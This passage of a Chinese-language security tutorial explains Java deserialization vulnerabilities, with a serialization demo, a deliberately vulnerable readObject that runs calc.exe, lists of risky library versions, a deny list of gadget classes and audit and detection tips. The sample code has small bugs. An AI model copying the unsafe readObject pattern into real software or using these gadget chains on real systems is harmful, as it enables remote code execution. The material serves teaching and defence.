java.io.Serializable接口。</h6><h5 id="下面是一个java的例子："><a href="#下面是一个java的例子：" class="headerlink" title="下面是一个java的例子："></a>下面是一个java的例子：</h5><h5 id="对象所属的类："><a href="#对象所属的类：" class="headerlink" title="对象所属的类："></a>对象所属的类：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.unctf.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Employee</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">	<span class="keyword">private</span> String name;</span><br><span class="line">	<span class="keyword">private</span> String age;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Employee</span><span class="params">(String name,String age)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.age=age;</span><br><span class="line">		<span class="keyword">this</span>.age=name;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"Hello "</span>+<span class="keyword">this</span>.name+<span class="string">" your age is "</span>+<span class="keyword">this</span>.age);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="将对象序列化为二进制文件："><a href="#将对象序列化为二进制文件：" class="headerlink" title="将对象序列化为二进制文件："></a>将对象序列化为二进制文件：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.unctf.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EmpSer</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Employee employee=<span class="keyword">new</span> Employee();</span><br><span class="line">		employee.name=<span class="string">"ljdd520"</span>;</span><br><span class="line">		employee.age=<span class="number">19</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			File file=<span class="keyword">new</span> File(<span class="string">"./src/com/unctf/demo/flag.txt"</span>);</span><br><span class="line">			FileOutputStream fos=<span class="keyword">new</span> FileOutputStream(file);</span><br><span class="line">			ObjectOutputStream oos=<span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">			<span class="comment">// 把对象序列化保存到flag.txt中</span></span><br><span class="line">			oos.writeObject(employee);</span><br><span class="line">			oos.close();</span><br><span class="line">		&#125;<span class="keyword">catch</span>(IOException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="反序列化是从flag-txt中提取出对象："><a href="#反序列化是从flag-txt中提取出对象：" class="headerlink" title="反序列化是从flag.txt中提取出对象："></a>反序列化是从flag.txt中提取出对象：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.unctf.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EmpUnser</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		File file = <span class="keyword">new</span> File(<span class="string">"./src/com/unctf/demo/flag.txt"</span>);</span><br><span class="line">		FileInputStream fis = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">		ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">		Employee employee = (Employee) ois.readObject();</span><br><span class="line">		ois.close();</span><br><span class="line">		fis.close();</span><br><span class="line">		System.out.println(employee.name);</span><br><span class="line">		System.out.println(employee.age);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="就这样，一个完整的序列化周期就完成了，其实实际应用中的序列化无非就是传输的方式和传输机制稍微复杂一点，和这个demo没有太大区别。"><a href="#就这样，一个完整的序列化周期就完成了，其实实际应用中的序列化无非就是传输的方式和传输机制稍微复杂一点，和这个demo没有太大区别。" class="headerlink" title="就这样，一个完整的序列化周期就完成了，其实实际应用中的序列化无非就是传输的方式和传输机制稍微复杂一点，和这个demo没有太大区别。"></a>就这样，一个完整的序列化周期就完成了，其实实际应用中的序列化无非就是传输的方式和传输机制稍微复杂一点，和这个demo没有太大区别。</h5><h4 id="0x2-简单的反序列化漏洞："><a href="#0x2-简单的反序列化漏洞：" class="headerlink" title="0x2 简单的反序列化漏洞："></a>0x2 简单的反序列化漏洞：</h4><h5 id="在Java反序列化中，会调用被反序列化的readObject方法，当readObject方法书写不当时就会引发漏洞。"><a href="#在Java反序列化中，会调用被反序列化的readObject方法，当readObject方法书写不当时就会引发漏洞。" class="headerlink" title="在Java反序列化中，会调用被反序列化的readObject方法，当readObject方法书写不当时就会引发漏洞。"></a>在Java反序列化中，会调用被反序列化的readObject方法，当readObject方法书写不当时就会引发漏洞。</h5><h5 id="PS：有时也会使用readUnshared-方法来读取对象，readUnshared-不允许后续的readObject和readUnshared调用引用这次调用反序列化得到的对象，而readObject读取的对象可以。"><a href="#PS：有时也会使用readUnshared-方法来读取对象，readUnshared-不允许后续的readObject和readUnshared调用引用这次调用反序列化得到的对象，而readObject读取的对象可以。" class="headerlink" title="PS：有时也会使用readUnshared()方法来读取对象，readUnshared()不允许后续的readObject和readUnshared调用引用这次调用反序列化得到的对象，而readObject读取的对象可以。"></a>PS：有时也会使用readUnshared()方法来读取对象，readUnshared()不允许后续的readObject和readUnshared调用引用这次调用反序列化得到的对象，而readObject读取的对象可以。</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.unctf.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UnsafeClass</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">	<span class="keyword">public</span> String name;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span>&#123;</span><br><span class="line">		<span class="comment">// 执行默认的readObject()方法</span></span><br><span class="line">		in.defaultReadObject();</span><br><span class="line">		Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test2</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">		UnsafeClass Unsafe=<span class="keyword">new</span> UnsafeClass();</span><br><span class="line">		Unsafe.name=<span class="string">"hacked by ljdd520"</span>;</span><br><span class="line">		File file=<span class="keyword">new</span> File(<span class="string">"./src/com/unctf/demo/flag.txt"</span>);</span><br><span class="line">		FileOutputStream fos=<span class="keyword">new</span> FileOutputStream(file);</span><br><span class="line">		ObjectOutputStream oos=<span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">		oos.writeObject(Unsafe);</span><br><span class="line">		oos.close();</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 从文件中反序列化对象</span></span><br><span class="line">		FileInputStream fis=<span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">		ObjectInputStream ois=<span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 开始恢复对象</span></span><br><span class="line">		UnsafeClass objectFromDisk=(UnsafeClass)ois.readObject();</span><br><span class="line">		System.out.println(objectFromDisk.name);</span><br><span class="line">		ois.close();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="运行的逻辑为："><a href="#运行的逻辑为：" class="headerlink" title="运行的逻辑为："></a>运行的逻辑为：</h4><h5 id="1-UnsafeClass类被序列化进flag-txt文件"><a href="#1-UnsafeClass类被序列化进flag-txt文件" class="headerlink" title="1.UnsafeClass类被序列化进flag.txt文件"></a>1.UnsafeClass类被序列化进flag.txt文件</h5><h5 id="2-从flag-txt文件中恢复对象"><a href="#2-从flag-txt文件中恢复对象" class="headerlink" title="2.从flag.txt文件中恢复对象"></a>2.从flag.txt文件中恢复对象</h5><h5 id="3-调用被恢复对象的readObject方法"><a href="#3-调用被恢复对象的readObject方法" class="headerlink" title="3.调用被恢复对象的readObject方法"></a>3.调用被恢复对象的readObject方法</h5><h5 id="4-命令执行"><a href="#4-命令执行" class="headerlink" title="4.命令执行"></a>4.命令执行</h5><h5 id="最后代码成功运行。"><a href="#最后代码成功运行。" class="headerlink" title="最后代码成功运行。"></a>最后代码成功运行。</h5><h4 id="反序列化漏洞的起源"><a href="#反序列化漏洞的起源" class="headerlink" title="反序列化漏洞的起源"></a>反序列化漏洞的起源</h4><h5 id="开发失误"><a href="#开发失误" class="headerlink" title="开发失误"></a>开发失误</h5><h5 id="之前的demo就是一个对反序列化完全没有进行安全审查的示例，但实战中不会有程序员会写出这种弱智代码。因此开发时产生的反序列化漏洞常见的有以下几种情况："><a href="#之前的demo就是一个对反序列化完全没有进行安全审查的示例，但实战中不会有程序员会写出这种弱智代码。因此开发时产生的反序列化漏洞常见的有以下几种情况：" class="headerlink" title="之前的demo就是一个对反序列化完全没有进行安全审查的示例，但实战中不会有程序员会写出这种弱智代码。因此开发时产生的反序列化漏洞常见的有以下几种情况："></a>之前的demo就是一个对反序列化完全没有进行安全审查的示例，但实战中不会有程序员会写出这种弱智代码。因此开发时产生的反序列化漏洞常见的有以下几种情况：</h5><h6 id="1-重写ObjectInputStream对象的resolveClass方法中的检测可被绕过。"><a href="#1-重写ObjectInputStream对象的resolveClass方法中的检测可被绕过。" class="headerlink" title="1.重写ObjectInputStream对象的resolveClass方法中的检测可被绕过。"></a>1.重写ObjectInputStream对象的resolveClass方法中的检测可被绕过。</h6><h6 id="2-使用第三方的类进行黑名单控制。虽然Java的语言严谨性要比PHP强的多，但在大型应用中想要采用黑名单机制禁用掉所有危险的对象几乎是不可能的。因此，如果在审计过程中发现了采用黑名单进行过滤的代码，多半存在一两个‘漏网之鱼’可以利用。并且采取黑名单方式仅仅可能保证此刻的安全，若在后期添加了新的功能，就可能引入了新的漏洞利用方式。所以仅靠黑名单是无法保证序列化过程的安全的。"><a href="#2-使用第三方的类进行黑名单控制。虽然Java的语言严谨性要比PHP强的多，但在大型应用中想要采用黑名单机制禁用掉所有危险的对象几乎是不可能的。因此，如果在审计过程中发现了采用黑名单进行过滤的代码，多半存在一两个‘漏网之鱼’可以利用。并且采取黑名单方式仅仅可能保证此刻的安全，若在后期添加了新的功能，就可能引入了新的漏洞利用方式。所以仅靠黑名单是无法保证序列化过程的安全的。" class="headerlink" title="2.使用第三方的类进行黑名单控制。虽然Java的语言严谨性要比PHP强的多，但在大型应用中想要采用黑名单机制禁用掉所有危险的对象几乎是不可能的。因此，如果在审计过程中发现了采用黑名单进行过滤的代码，多半存在一两个‘漏网之鱼’可以利用。并且采取黑名单方式仅仅可能保证此刻的安全，若在后期添加了新的功能，就可能引入了新的漏洞利用方式。所以仅靠黑名单是无法保证序列化过程的安全的。"></a>2.使用第三方的类进行黑名单控制。虽然Java的语言严谨性要比PHP强的多，但在大型应用中想要采用黑名单机制禁用掉所有危险的对象几乎是不可能的。因此，如果在审计过程中发现了采用黑名单进行过滤的代码，多半存在一两个‘漏网之鱼’可以利用。并且采取黑名单方式仅仅可能保证此刻的安全，若在后期添加了新的功能，就可能引入了新的漏洞利用方式。所以仅靠黑名单是无法保证序列化过程的安全的。</h6><h5 id="基础库中隐藏的反序列化漏洞"><a href="#基础库中隐藏的反序列化漏洞" class="headerlink" title="基础库中隐藏的反序列化漏洞"></a>基础库中隐藏的反序列化漏洞</h5><h6 id="优秀的Java开发人员一般会按照安全编程规范进行编程，很大程度上减少了反序列化漏洞的产生。并且一些成熟的Java框架比如Spring-MVC、Struts2等，都有相应的防范反序列化的机制。如果仅仅是开发失误，可能很少会产生反序列化漏洞，即使产生，其绕过方法、利用方式也较为复杂。但其实，有很大比例的反序列化漏洞是因使用了不安全的基础库而产生的。"><a href="#优秀的Java开发人员一般会按照安全编程规范进行编程，很大程度上减少了反序列化漏洞的产生。并且一些成熟的Java框架比如Spring-MVC、Struts2等，都有相应的防范反序列化的机制。如果仅仅是开发失误，可能很少会产生反序列化漏洞，即使产生，其绕过方法、利用方式也较为复杂。但其实，有很大比例的反序列化漏洞是因使用了不安全的基础库而产生的。" class="headerlink" title="优秀的Java开发人员一般会按照安全编程规范进行编程，很大程度上减少了反序列化漏洞的产生。并且一些成熟的Java框架比如Spring MVC、Struts2等，都有相应的防范反序列化的机制。如果仅仅是开发失误，可能很少会产生反序列化漏洞，即使产生，其绕过方法、利用方式也较为复杂。但其实，有很大比例的反序列化漏洞是因使用了不安全的基础库而产生的。"></a>优秀的Java开发人员一般会按照安全编程规范进行编程，很大程度上减少了反序列化漏洞的产生。并且一些成熟的Java框架比如Spring MVC、Struts2等，都有相应的防范反序列化的机制。如果仅仅是开发失误，可能很少会产生反序列化漏洞，即使产生，其绕过方法、利用方式也较为复杂。但其实，有很大比例的反序列化漏洞是因使用了不安全的基础库而产生的。</h6><h6 id="2015年由黑客Gabriel-Lawrence和Chris-Frohoff发现的‘Apache-Commons-Collections’类库直接影响了WebLogic、WebSphere、JBoss、Jenkins、OpenNMS等大型框架。直到今天该漏洞的影响仍未消散。"><a href="#2015年由黑客Gabriel-Lawrence和Chris-Frohoff发现的‘Apache-Commons-Collections’类库直接影响了WebLogic、WebSphere、JBoss、Jenkins、OpenNMS等大型框架。直到今天该漏洞的影响仍未消散。" class="headerlink" title="2015年由黑客Gabriel Lawrence和Chris Frohoff发现的‘Apache Commons Collections’类库直接影响了WebLogic、WebSphere、JBoss、Jenkins、OpenNMS等大型框架。直到今天该漏洞的影响仍未消散。"></a>2015年由黑客Gabriel Lawrence和Chris Frohoff发现的‘Apache Commons Collections’类库直接影响了WebLogic、WebSphere、JBoss、Jenkins、OpenNMS等大型框架。直到今天该漏洞的影响仍未消散。</h6><h6 id="存在危险的基础库："><a href="#存在危险的基础库：" class="headerlink" title="存在危险的基础库："></a>存在危险的基础库：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">commons-fileupload 1.3.1</span><br><span class="line">commons-io 2.4</span><br><span class="line">commons-collections 3.1</span><br><span class="line">commons-logging 1.2</span><br><span class="line">commons-beanutils 1.9.2</span><br><span class="line">org.slf4j:slf4j-api 1.7.21</span><br><span class="line">com.mchange:mchange-commons-java 0.2.11</span><br><span class="line">org.apache.commons:commons-collections 4.0</span><br><span class="line">com.mchange:c3p0 0.9.5.2</span><br><span class="line">org.beanshell:bsh 2.0b5</span><br><span class="line">org.codehaus.groovy:groovy 2.3.9</span><br><span class="line">org.springframework:spring-aop 4.1.4.RELEASE</span><br></pre></td></tr></table></figure>

<h5 id="某反序列化防护软件便是通过禁用以下类的反序列化来保护程序："><a href="#某反序列化防护软件便是通过禁用以下类的反序列化来保护程序：" class="headerlink" title="某反序列化防护软件便是通过禁用以下类的反序列化来保护程序："></a>某反序列化防护软件便是通过禁用以下类的反序列化来保护程序：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&apos;org.apache.commons.collections.functors.InvokerTransformer&apos;,</span><br><span class="line">&apos;org.apache.commons.collections.functors.InstantiateTransformer&apos;,</span><br><span class="line">&apos;org.apache.commons.collections4.functors.InvokerTransformer&apos;,</span><br><span class="line">&apos;org.apache.commons.collections4.functors.InstantiateTransformer&apos;,</span><br><span class="line">&apos;org.codehaus.groovy.runtime.ConvertedClosure&apos;,</span><br><span class="line">&apos;org.codehaus.groovy.runtime.MethodClosure&apos;,</span><br><span class="line">&apos;org.springframework.beans.factory.ObjectFactory&apos;,</span><br><span class="line">&apos;xalan.internal.xsltc.trax.TemplatesImpl&apos;</span><br></pre></td></tr></table></figure>

<h5 id="基础库中的调用流程一般都比较复杂，比如org-apache-commons-collections-functors-InvokerTransformer的POP链就涉及反射、泛型等，而网上也有很多复现跟踪流程的文章，比如前些天先知发布的这两篇。"><a href="#基础库中的调用流程一般都比较复杂，比如org-apache-commons-collections-functors-InvokerTransformer的POP链就涉及反射、泛型等，而网上也有很多复现跟踪流程的文章，比如前些天先知发布的这两篇。" class="headerlink" title="基础库中的调用流程一般都比较复杂，比如org.apache.commons.collections.functors.InvokerTransformer的POP链就涉及反射、泛型等，而网上也有很多复现跟踪流程的文章，比如前些天先知发布的这两篇。"></a>基础库中的调用流程一般都比较复杂，比如org.apache.commons.collections.functors.InvokerTransformer的POP链就涉及反射、泛型等，而网上也有很多复现跟踪流程的文章，比如前些天先知发布的这两篇。</h5><h5 id="Java反序列化漏洞-玄铁重剑之CommonsCollection-上"><a href="#Java反序列化漏洞-玄铁重剑之CommonsCollection-上" class="headerlink" title="Java反序列化漏洞-玄铁重剑之CommonsCollection(上)"></a><a href="https://xianzhi.aliyun.com/forum/topic/2028" target="_blank" rel="noopener">Java反序列化漏洞-玄铁重剑之CommonsCollection(上)</a></h5><h5 id="Java反序列化漏洞-玄铁重剑之CommonsCollection-下"><a href="#Java反序列化漏洞-玄铁重剑之CommonsCollection-下" class="headerlink" title="Java反序列化漏洞-玄铁重剑之CommonsCollection(下)"></a><a href="https://xianzhi.aliyun.com/forum/topic/2029?from=groupmessage" target="_blank" rel="noopener">Java反序列化漏洞-玄铁重剑之CommonsCollection(下)</a></h5><h5 id="这里就不再赘述了，可以跟着ysoserial的EXP去源码中一步步跟进、调试。"><a href="#这里就不再赘述了，可以跟着ysoserial的EXP去源码中一步步跟进、调试。" class="headerlink" title="这里就不再赘述了，可以跟着ysoserial的EXP去源码中一步步跟进、调试。"></a>这里就不再赘述了，可以跟着ysoserial的EXP去源码中一步步跟进、调试。</h5><h4 id="如何发现Java反序列化漏洞"><a href="#如何发现Java反序列化漏洞" class="headerlink" title="如何发现Java反序列化漏洞"></a>如何发现Java反序列化漏洞</h4><h4 id="白盒检测"><a href="#白盒检测" class="headerlink" title="白盒检测"></a>白盒检测</h4><h5 id="当持有程序源码时，可以采用这种方法，逆向寻找漏洞。"><a href="#当持有程序源码时，可以采用这种方法，逆向寻找漏洞。" class="headerlink" title="当持有程序源码时，可以采用这种方法，逆向寻找漏洞。"></a>当持有程序源码时，可以采用这种方法，逆向寻找漏洞。</h5><h5 id="反序列化操作一般应用在导入模板文件、网络通信、数据传输、日志格式化存储、对象数据落磁盘、或DB存储等业务场景。因此审计过程中重点关注这些功能板块。"><a href="#反序列化操作一般应用在导入模板文件、网络通信、数据传输、日志格式化存储、对象数据落磁盘、或DB存储等业务场景。因此审计过程中重点关注这些功能板块。" class="headerlink" title="反序列化操作一般应用在导入模板文件、网络通信、数据传输、日志格式化存储、对象数据落磁盘、或DB存储等业务场景。因此审计过程中重点关注这些功能板块。"></a>反序列化操作一般应用在导入模板文件、网络通信、数据传输、日志格式化存储、对象数据落磁盘、或DB存储等业务场景。因此审计过程中重点关注这些功能板块。</h5><h5 id="流程如下："><a href="#流程如下：" class="headerlink" title="流程如下："></a>流程如下：</h5><h5 id="①-通过检索源码中对反序列化函数的调用来静态寻找反序列化的输入点"><a href="#①-通过检索源码中对反序列化函数的调用来静态寻找反序列化的输入点" class="headerlink" title="① 通过检索源码中对反序列化函数的调用来静态寻找反序列化的输入点"></a>① 通过检索源码中对反序列化函数的调用来静态寻找反序列化的输入点</h5><h5 id="可以搜索以下函数："><a href="#可以搜索以下函数：" class="headerlink" title="可以搜索以下函数："></a>可以搜索以下函数：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject</span><br><span class="line">ObjectInputStream.readUnshared</span><br><span class="line">XMLDecoder.readObject</span><br><span class="line">Yaml.load</span><br><span class="line">XStream.fromXML</span><br><span class="line">ObjectMapper.readValue</span><br><span class="line">JSON.parseObject</span><br></pre></td></tr></table></figure>

<h5 id="小数点前面是类名，后面是方法名"><a href="#小数点前面是类名，后面是方法名" class="headerlink" title="小数点前面是类名，后面是方法名"></a>小数点前面是类名，后面是方法名</h5><h5 id="②-确定了反序列化输入点后，再考察应用的Class-Path中是否包含Apache-Commons-Collections等危险库（ysoserial所支持的其他库亦可）。"><a href="#②-确定了反序列化输入点后，再考察应用的Class-Path中是否包含Apache-Commons-Collections等危险库（ysoserial所支持的其他库亦可）。" class="headerlink" title="② 确定了反序列化输入点后，再考察应用的Class Path中是否包含Apache Commons Collections等危险库（ysoserial所支持的其他库亦可）。"></a>② 确定了反序列化输入点后，再考察应用的Class Path中是否包含Apache Commons Collections等危险库（ysoserial所支持的其他库亦可）。</h5><h5 id="③-若不包含危险库，则查看一些涉及命令、代码执行的代码区域，防止程序员代码不严谨，导致bug。"><a href="#③-若不包含危险库，则查看一些涉及命令、代码执行的代码区域，防止程序员代码不严谨，导致bug。" class="headerlink" title="③ 若不包含危险库，则查看一些涉及命令、代码执行的代码区域，防止程序员代码不严谨，导致bug。"></a>③ 若不包含危险库，则查看一些涉及命令、代码执行的代码区域，防止程序员代码不严谨，导致bug。</h5><h5 id="④-若包含危险库，则使用ysoserial进行攻击复现。"><a href="#④-若包含危险库，则使用ysoserial进行攻击复现。" class="headerlink" title="④ 若包含危险库，则使用ysoserial进行攻击复现。"></a>④ 若包含危险库，则使用ysoserial进行攻击复现。</h5><p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180208135317-5be133f0-0c94-1.png" alt></p>
<h4 id="黑盒检测"><a href="#黑盒检测" class="headerlink" title="黑盒检测"></a>黑盒检测</h4><h5 id="在黑盒测试中并不清楚对方的代码架构，但仍然可以通过分析十六进制数据块，锁定某些存在漏洞的通用基础库（比如Apache-Commons-Collection）的调用地点，并进行数据替换，从而实现利用。"><a href="#在黑盒测试中并不清楚对方的代码架构，但仍然可以通过分析十六进制数据块，锁定某些存在漏洞的通用基础库（比如Apache-Commons-Collection）的调用地点，并进行数据替换，从而实现利用。" class="headerlink" title="在黑盒测试中并不清楚对方的代码架构，但仍然可以通过分析十六进制数据块，锁定某些存在漏洞的通用基础库（比如Apache Commons Collection）的调用地点，并进行数据替换，从而实现利用。"></a>在黑盒测试中并不清楚对方的代码架构，但仍然可以通过分析十六进制数据块，锁定某些存在漏洞的通用基础库（比如Apache Commons Collection）的调用地点，并进行数据替换，从而实现利用。</h5><h5 id="在实战过程中，我们可以通过抓包来检测请求中可能存在的序列化数据。"><a href="#在实战过程中，我们可以通过抓包来检测请求中可能存在的序列化数据。" class="headerlink" title="在实战过程中，我们可以通过抓包来检测请求中可能存在的序列化数据。"></a>在实战过程中，我们可以通过抓包来检测请求中可能存在的序列化数据。</h5><h5 id="序列化数据通常以AC-ED开始，之后的两个字节是版本号，版本号一般是00-05但在某些情况下可能是更高的数字。"><a href="#序列化数据通常以AC-ED开始，之后的两个字节是版本号，版本号一般是00-05但在某些情况下可能是更高的数字。" class="headerlink" title="序列化数据通常以AC ED开始，之后的两个字节是版本号，版本号一般是00 05但在某些情况下可能是更高的数字。"></a>序列化数据通常以AC ED开始，之后的两个字节是版本号，版本号一般是00 05但在某些情况下可能是更高的数字。</h5><h5 id="我们可以通过xxd-winhex等工具看序列化后的文件。"><a href="#我们可以通过xxd-winhex等工具看序列化后的文件。" class="headerlink" title="我们可以通过xxd,winhex等工具看序列化后的文件。"></a>我们可以通过<code>xxd</code>,<code>winhex</code>等工具看序列化后的文件。</h5><h5 id="需要注意的是，AC-ED-00-05是常见的序列化数据开始，但有些应用程序在整个运行周期中保持与服务器的网络连接，如果攻击载荷是在延迟中发送的，那检测这四个字节就是无效的。所以有些防火墙工具在检测反序列化数据时仅仅检测这几个字节是不安全的设置。"><a href="#需要注意的是，AC-ED-00-05是常见的序列化数据开始，但有些应用程序在整个运行周期中保持与服务器的网络连接，如果攻击载荷是在延迟中发送的，那检测这四个字节就是无效的。所以有些防火墙工具在检测反序列化数据时仅仅检测这几个字节是不安全的设置。" class="headerlink" title="需要注意的是，AC ED 00 05是常见的序列化数据开始，但有些应用程序在整个运行周期中保持与服务器的网络连接，如果攻击载荷是在延迟中发送的，那检测这四个字节就是无效的。所以有些防火墙工具在检测反序列化数据时仅仅检测这几个字节是不安全的设置。"></a>需要注意的是，<code>AC ED 00 05</code>是常见的序列化数据开始，但有些应用程序在整个运行周期中保持与服务器的网络连接，如果攻击载荷是在延迟中发送的，那检测这四个字节就是无效的。所以有些防火墙工具在检测反序列化数据时仅仅检测这几个字节是不安全的设置。</h5><h5 